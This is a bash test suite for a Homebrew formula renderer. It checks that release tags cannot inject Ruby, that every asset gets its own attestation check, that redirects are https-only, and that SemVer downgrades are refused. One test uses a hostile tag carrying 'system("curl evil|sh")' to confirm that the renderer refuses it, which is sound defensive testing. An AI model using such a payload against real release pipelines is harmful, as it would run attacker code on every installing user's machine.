#!/usr/bin/env bash
#
# Version handling of render-formulae.sh: the release tag as remote text, SemVer precedence, first publication and active url lines, digest verification and https-only redirects.
#
# Part of the render-formulae suite; see render-formulae.test.sh for the harness.
#
# Requires: python3 with cryptography, bash 4+.

set -euo pipefail

HERE_FIXTURE="$(cd "$(dirname "${BASH_SOURCE[0]}")/../fixtures/release" && pwd)"
# The linter cannot follow a sourced path built at run time, and the fixture
# is where check() and the counters live. The disable is on the source line
# alone; the counters are re-declared here so nothing downstream has to be
# excused for reading them.
# shellcheck disable=SC1091
. "$HERE_FIXTURE/render-fixture.sh"
pass=0
fail=0



# Shared setup: the same signed v9.9.9 release rendered once into $WORK/r1, which
# the cases below reuse as their starting tree.
publish Glyndor/podup v9.9.9 podup-darwin-arm64 podup-darwin-x86_64
new_root "$WORK/r1"
generator_with "$WORK/r1/scripts/release/render-formulae.sh" "$PODUP"
run "$WORK/r1/scripts/release/render-formulae.sh" "$WORK/r1" || true

# --- the release tag is remote text, and it lands in generated Ruby ---------
#
# SHA256SUMS is signed and its digests are checked to be 64 hex characters. The
# TAG travels beside that signature rather than inside it, and it reaches an
# unquoted heredoc that writes Ruby. A tag that closes the version string
# appends code that runs on every `brew install`.
#
# The fixture below is signed with the real ephemeral key, because that is the
# actual scenario: a perfectly valid signature over the digests, and a hostile
# tag alongside it.
publish "Glyndor/podup" 'v1.0.0"
  def self.pwned; system("curl evil|sh"); end
  version "1.0.0' podup-darwin-arm64 podup-darwin-x86_64
rc=0
out="$( cd "$WORK/r1" && "$WORK/r1/scripts/release/render-formulae.sh" --pubkey "$PUBKEY" 2>&1 )" || rc=$?
check "a release tag carrying Ruby is refused" "3" "$rc"
check "and the error names the tag rather than the signature" "1" \
	"$(printf '%s' "$out" | grep -c 'not a plain version')"
# `grep -c` exits 1 on zero matches, so a `|| echo 0` fallback fires ON TOP of
# the 0 grep already printed and yields two lines. Count with a pipeline whose
# exit code nobody reads instead.
check "and no formula was written from it" "0" \
	"$(grep -c 'def self.pwned' < "$WORK/r1/Formula/podup.rb" 2>/dev/null | tr -d '\n')"

# Tags that are merely unusual must still render, or the guard is a version
# policy rather than an injection guard.
for good in "v1.0.0-rc.1" "v1.0.0+build.5" "v10.20.30"; do
	rm -f "$WORK/r1/Formula/podup.rb"
	publish "Glyndor/podup" "$good" podup-darwin-arm64 podup-darwin-x86_64
	rc=0
	( cd "$WORK/r1" && "$WORK/r1/scripts/release/render-formulae.sh" --pubkey "$PUBKEY" ) >/dev/null 2>&1 || rc=$?
	check "the ordinary tag $good still renders" "0" "$rc"
done

# Restore the fixture the later cases expect.
rm -f "$WORK/r1/Formula/podup.rb"
publish "Glyndor/podup" "v1.2.3" podup-darwin-arm64 podup-darwin-x86_64

# --- every published digest is verified against the tag ----------------------
#
# The signer of SHA256SUMS authenticates the LIST of digests, not the tag each
# entry was built from. Verifying one asset leaves the rest of the list
# attested only by the signature, which is exactly the gap that lets a release
# editor re-upload last year's binaries for one architecture while keeping the
# genuine newer attestation on the other. Every published digest has to be
# checked, and the run has to fail closed if any one of them refuses.

# Refusal that targets the SECOND asset of two. The render aborts before
# writing anything, the formula that was on disk stays byte-identical, and the
# error names the asset the stub refused. The shell substitution captures the
# full stderr stream so the assertion can grep it for the asset name.
publish Glyndor/podup v9.9.9 podup-darwin-arm64 podup-darwin-x86_64
unset ATTEST_STUB_OUTCOME
export ATTEST_STUB_REFUSE_ASSET=podup-darwin-x86_64
new_root "$WORK/r21"
generator_with "$WORK/r21/scripts/release/render-formulae.sh" "$PODUP"
printf 'PRE-EXISTING-FORMULA\n' > "$WORK/r21/Formula/podup.rb"
rc=0
out="$( cd "$WORK/r21" && "$WORK/r21/scripts/release/render-formulae.sh" \
	--pubkey "$PUBKEY" 2>&1 )" || rc=$?
unset ATTEST_STUB_REFUSE_ASSET
check "a second asset with provenance for another tag is refused" "3" "$rc"
check "and the formula on disk is left as it was" "PRE-EXISTING-FORMULA" \
	"$(cat "$WORK/r21/Formula/podup.rb")"
check "and the refusal names that asset" "1" \
	"$(printf '%s' "$out" | grep -c 'stub gh: refusing attestation verify for podup-darwin-x86_64')"

# Two assets, no refusal. The renderer has to reach verify_attestation once
# for each asset: otherwise the bug above is back, because only one digest
# would be bound to the tag and the other would ride on the SHA256SUMS
# signature alone. The stub's call log records every verify invocation
# regardless of outcome, so the count reflects what the renderer ASKED for
# rather than what the stub accepted. Setting ATTEST_STUB_LOG points the log
# at a per-test file the assertion greps.
publish Glyndor/podup v9.9.9 podup-darwin-arm64 podup-darwin-x86_64
unset ATTEST_STUB_OUTCOME
unset ATTEST_STUB_REFUSE_ASSET
new_root "$WORK/r22"
generator_with "$WORK/r22/scripts/release/render-formulae.sh" "$PODUP"
export ATTEST_STUB_LOG="$WORK/r22.attest.log"
: > "$ATTEST_STUB_LOG"
run "$WORK/r22/scripts/release/render-formulae.sh" "$WORK/r22" || true
unset ATTEST_STUB_LOG
check "every asset gets its own provenance check (2 of 2)" "2" \
	"$(grep -c '^attestation verify ' "$WORK/r22.attest.log")"

# --- the asset download follows https redirects only ------------------------
#
# github.com answers a release download with a redirect to the object store.
# `-L` follows whatever scheme the redirect names; the installer in the apt
# repository pins it to https with --proto-redir, and the renderer did not.
# The digest is checked afterwards, so a tampered body is caught, but the
# transport should not follow a plain-http hop in the first place. The unit is
# drift-compared with the sibling repository, so both carry the same line.
check "verify_attestation downloads the asset over https-only redirects" "1" \
	"$(sed -n '/^verify_attestation()/,/^}/p' "$HERE/scripts/release/render-formulae.sh" | grep -cE -- '--proto-redir =https([[:space:]]|$)')"

# Version precedence: stable beats pre-release, build metadata has no weight,
# numeric identifiers compare numerically, and a shorter pre-release sorts first.
for versions in \
	"1.0.0|1.0.0-rc1|1" \
	"1.0.0|1.0.0+build.5|0" \
	"1.0.0-rc.10|1.0.0-rc.2|1" \
	"1.0.0-rc.1|1.0.0-rc|1" \
	"1.0.0-alpha|1.0.0-1|1" \
	"1.0.0-rc1|1.0.0|0"; do
	IFS='|' read -r served candidate expected <<<"$versions"
	new_root "$WORK/precedence"
	generator_with "$WORK/precedence/scripts/release/render-formulae.sh" "$PODUP"
	publish Glyndor/podup "v$served" podup-darwin-arm64 podup-darwin-x86_64
	run "$WORK/precedence/scripts/release/render-formulae.sh" "$WORK/precedence"
	cp "$WORK/precedence/Formula/podup.rb" "$WORK/precedence.before"
	publish Glyndor/podup "v$candidate" podup-darwin-arm64 podup-darwin-x86_64
	rc=0; run "$WORK/precedence/scripts/release/render-formulae.sh" "$WORK/precedence" || rc=$?
	check "$served -> $candidate respects version precedence" "$expected" "$rc"
	if [ "$expected" = "1" ]; then
		contains "the precedence refusal identifies both versions" "$WORK/out" \
			"::error::Glyndor/podup: refusing release downgrade from served $served to candidate $candidate"
		check "the pre-release downgrade preserves every byte" "0" \
			"$(cmp -s "$WORK/precedence.before" "$WORK/precedence/Formula/podup.rb"; echo $?)"
	elif [[ "$candidate" == *+* ]]; then
		contains "build metadata alone is not a downgrade: the formula is rendered for the new tag" \
			"$WORK/precedence/Formula/podup.rb" "/releases/download/v$candidate/"
	else
		contains "the stable release replaces its pre-release" "$WORK/precedence/Formula/podup.rb" \
			"/releases/download/v$candidate/"
	fi
done

# A candidate that is not SemVer is refused even on a first publication, when
# there is no served formula to compare with: published, it would make the next
# valid release abort on a served version that cannot be parsed.
new_root "$WORK/first"
generator_with "$WORK/first/scripts/release/render-formulae.sh" "$PODUP"
publish Glyndor/podup "v01.0.0" podup-darwin-arm64 podup-darwin-x86_64
rc=0; run "$WORK/first/scripts/release/render-formulae.sh" "$WORK/first" || rc=$?
check "a first publication with a leading-zero version is refused" "1" "$rc"
contains "and the error names the version" "$WORK/out" "'01.0.0' is not a valid SemVer release version"
check "and no formula was written" "0" "$([ -f "$WORK/first/Formula/podup.rb" ] && echo 1 || echo 0)"

# Only active url lines say what is served: a comment naming another version
# must neither block a release nor stand in for the real one.
new_root "$WORK/served"
generator_with "$WORK/served/scripts/release/render-formulae.sh" "$PODUP"
publish Glyndor/podup "v1.0.0" podup-darwin-arm64 podup-darwin-x86_64
run "$WORK/served/scripts/release/render-formulae.sh" "$WORK/served"
{
	echo '# url "https://github.com/Glyndor/podup/releases/download/v9.9.9/podup-darwin-arm64"'
	cat "$WORK/served/Formula/podup.rb"
} > "$WORK/served.rb" && cp "$WORK/served.rb" "$WORK/served/Formula/podup.rb"
publish Glyndor/podup "v1.0.1" podup-darwin-arm64 podup-darwin-x86_64
rc=0; run "$WORK/served/scripts/release/render-formulae.sh" "$WORK/served" || rc=$?
check "a commented url naming a higher version does not block a release" "0" "$rc"
sed -i 's|^\([[:space:]]*\)url "|\1# url "|' "$WORK/served/Formula/podup.rb"
publish Glyndor/podup "v1.0.2" podup-darwin-arm64 podup-darwin-x86_64
rc=0; run "$WORK/served/scripts/release/render-formulae.sh" "$WORK/served" || rc=$?
check "a formula whose urls are all commented out has no served version" "1" "$rc"
contains "and the error says so" "$WORK/out" "cannot determine a unique served version"


echo
echo "$pass passed, $fail failed"
printf 'DONE %s %d %d\n' "${BASH_SOURCE[0]##*/}" "$pass" "$fail"
[ "$fail" -eq 0 ]
